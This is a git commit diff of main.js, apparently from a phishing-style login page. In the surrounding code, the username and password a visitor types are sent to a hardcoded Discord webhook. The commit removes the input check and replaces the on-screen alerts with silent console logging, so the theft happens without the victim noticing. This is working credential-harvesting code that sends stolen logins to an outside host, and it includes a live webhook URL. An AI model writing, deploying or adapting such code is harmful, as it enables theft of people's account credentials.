2ad993e9e59d0c9178850327a3bd01b5a5a808e3
youssef-refaa1 <108181923+youssef-refaa1@users.noreply.github.com>
2024-06-22 09:13:27 +0300

    sda

--- main.js
+++ main.js
@@ -7,12 +7,6 @@ $(document).ready(function() {
             // Your Discord Webhook URL
             var webhookURL = 'https://discord.com/api/webhooks/1253944495553249290/TcSylyaged1n1oG5A-XV0zFcjn047x33t9UibNEnXpLkI1VH-lsex21dKIcOzvz9RKyw';
 
-            // Ensure user and password are provided
-            if (!user || !password) {
-                alert('Please enter both username and password.');
-                return;
-            }
-
             // Data to send to the webhook
             var data = {
                 content: `User: ${user}\nPassword: ${password}`
@@ -25,10 +19,10 @@ $(document).ready(function() {
                 contentType: 'application/json',
                 data: JSON.stringify(data),
                 success: function(response) {
-                    alert('Information sent successfully!');
+                    console.log('Information sent successfully!');
                 },
                 error: function(xhr, status, error) {
-                    alert('Error sending information: ' + xhr.responseText);
+                    console.log('Error sending information: ' + xhr.responseText);
                 }
             });
         }); 
